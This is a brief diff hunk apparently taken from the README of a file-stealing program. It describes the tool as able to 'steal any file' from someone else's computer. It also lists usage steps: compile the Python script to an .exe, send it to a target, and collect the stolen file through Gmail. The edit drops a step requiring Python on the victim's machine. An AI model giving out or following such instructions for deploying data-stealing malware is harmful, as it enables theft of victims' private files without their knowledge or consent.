@@ -7,6 +7,5 @@ this thing can steal any file on another dude computer...
   
 - first, convert the code from .py to .exe
 - second, send to your target you wanna steal
-- third, make sure your target also have python installed
-- fourth, await the file in your gmail
+- third, await the file in your gmail
 
